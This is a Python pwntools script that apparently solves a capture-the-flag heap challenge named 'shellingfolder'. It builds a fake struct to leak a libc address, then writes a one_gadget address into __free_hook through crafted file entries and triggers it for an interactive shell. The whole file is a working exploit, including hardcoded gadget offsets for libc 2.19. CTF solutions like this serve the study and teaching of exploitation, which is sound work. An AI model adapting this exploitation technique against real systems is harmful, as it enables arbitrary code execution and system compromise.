#!/usr/bin/env python
from pwn import *
from os import getcwd, path

context.terminal = ['tmux', 'sp', '-h']
#context.log_level = 'debug'

elf  = ELF('./shellingfolder')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.19.so')

def attach(addr):
	gdb.attach(io, 'b *{:#x}\nc'.format(addr + io.libs()[elf.path]))

io = process(elf.path, env = {'LD_PRELOAD': path.join(getcwd(), './libdealarm.so')})

def makeFolder(name):
	io.sendlineafter('choice:', '3')
	io.sendafter('Folder:', name)

def createFile(name, size):
	io.sendlineafter('choice:', '4')
	io.sendafter('File:', name)
	io.sendlineafter('File:', str(size))
	
def removeFolderOrFile(name):
	io.sendlineafter('choice:', '5')
	io.sendlineafter('file :', name)

makeFolder('A')
makeFolder('B')
createFile('C' * 24 + p8(0x10), 64) # fake struct

removeFolderOrFile('B') # populate with glibc

io.sendlineafter('choice:', '6')
io.sendlineafter('choice:', '1')

io.recvuntil('-\n')
libc.address = u64(io.recv(6).ljust(8, '\0')) - 0x3c27b8
log.info('Libc @ {:#x}'.format(libc.address))

magic = [0x4647c, 0xc5af3, 0xc5b42, 0xe8618, 0xe9415, 0xea36d]

free_hook  = libc.sym['__free_hook']
one_gadget = libc.address + magic[0]

createFile('D' * 24 + p64(free_hook)[:7], one_gadget & 0xffffffff)
createFile('E' * 24 + p64(free_hook + 4)[:7], (one_gadget & 0xffffffff00000000) >> 32)

io.sendlineafter('choice:', '6')

#attach(0xe11)

makeFolder('X')
removeFolderOrFile('X') # trigger __free_hook

io.interactive()